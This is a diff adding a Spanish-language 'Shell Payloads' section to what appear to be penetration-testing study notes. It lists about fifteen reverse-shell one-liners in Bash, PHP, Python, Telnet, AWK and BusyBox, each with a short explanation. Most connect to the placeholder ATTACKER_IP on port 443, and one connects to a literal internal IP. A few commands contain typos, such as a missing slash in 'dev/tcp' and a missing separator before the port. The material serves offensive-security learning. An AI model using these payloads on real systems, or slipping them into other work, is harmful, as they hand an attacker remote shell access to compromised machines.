@@ -120,3 +120,139 @@ socat -d -d TCP-LISTEN:443 STDOUT
 
 ## Shell Payloads
 
+Una carga útil de shell puede ser un comando o script que expone el shell a una conexión entrante en el caso de un shell de enlace o a una conexión de envío en el caso de un shell inverso.
+
+### Bash
+
+**Normal Bash Reverse Shell**
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+
+Esta shell reversa inicia una bash shell interactiva que redireccione el input y output a través de una conexión TCP a la IP del atacante en el puerto 443. El operador `>&` combina tanto la salida estándar como el error estándar.
+
+**Bash Read Line Reverse Shell**
+
+```bash
+exec 5<>dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+
+Esta shell inversa crea un nuevo descriptor de archivo (el 5 en este caso) y se conecta a un socket TCP. Leerá y ejecutará comandos desde el socket, enviando la salida de vuelta a través del mismo socket.
+
+**Bash With File Descriptor 196 Reverse Shell**
+
+```bash
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+```
+
+Esta shell inversa utiliza un descriptor de archivo (196 en este caso) para establecer una conexión TCP. Permite que la shell lea comandos de la red y envíe la salida a través de la misma conexión.
+
+**Bash With File Descriptor 5 Reverse Shell**
+
+```bash
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1<&5 2>&5
+```
+
+De forma similar al primer ejemplo, este comando abre un intérprete de comandos (bash -i), pero utiliza el descriptor de archivo 5 para la entrada y la salida, lo que permite una sesión interactiva a través de la conexión TCP.
+
+### PHP
+
+**PHP Reverse Shell Using the exec Function**
+
+```bash
+php -r '$socl=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3")'
+```
+
+Esta shell inversa crea una conexión de socket con la IP del atacante en el puerto 443 y utiliza la función exec para ejecutar una shell, redirigiendo la entrada y salida estándar.
+
+**PHP Reverse Shell Using the shell_exec Function**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+```
+
+Similar al comando anterior, pero usa la función `shell_exec`.
+
+**PHP Reverse Shell Using the system Function**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+```
+
+Este reverse shell emplea la función `system`, el cual ejecuta el comando y direcciona la salida del resultado al navegador.
+
+**PHP Reverse Shell Using the passthru Function**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+```
+
+La función passthru ejecuta un comando y envía la salida sin procesar al navegador. Esto resulta útil al trabajar con datos binarios.
+
+**PHP Reverse Shell Using the popen Function**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+```
+
+Este intérprete de comandos inverso utiliza popen para abrir un puntero de archivo de proceso, lo que permite ejecutar el intérprete.
+
+### Python
+
+Tenga en cuenta que los siguientes fragmentos de código requieren el uso de python -c para ejecutarse, como se indica con el marcador de posición PY-C.
+
+
+**Python Reverse Shell by Exporting Environment Variables**
+
+```bash
+export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+
+Este shell inverso establece el host remoto y el puerto como variables de entorno, crea una conexión de socket y duplica el descriptor de archivo del socket para la entrada/salida estándar.
+
+**Python Reverse Shell Using the subprocess Module**
+
+```bash
+PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+```
+
+Esta shell inversa utiliza el módulo subprocess para generar una shell y configurar un entorno similar al del comando Python Reverse Shell by Exporting Environment Variables.
+
+**Short Python Reverse Shell**
+
+```bash
+PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
+Esta shell inversa crea uno o más sockets, se conecta al atacante y redirige la entrada, la salida y los errores estándar al socket mediante os.dup2().3
+
+### Otros
+
+**Telnet**
+
+```bash
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
+```
+
+Esta shell inversa crea una tubería con nombre usando mkfifo y se conecta al atacante a través de Telnet en la IP ATTACKER_IP y el puerto 443.
+
+**AWK**
+
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+Esta shell inversa utiliza las capacidades TCP integradas de AWK para conectarse a ATTACKER_IP:443. Lee los comandos del atacante y los ejecuta. Luego, envía los resultados de vuelta a través de la misma conexión TCP.
+
+**BusyBox**
+
+```bash
+busybox nc ATTACKER_IP 443 -e sh
+```
+
+Esta shell inversa de BusyBox utiliza Netcat (nc) para conectarse al atacante en ATTACKER_IP:443. Una vez conectado, ejecuta /bin/sh, exponiendo la línea de comandos al atacante.
+
+
+## Web Shell
+
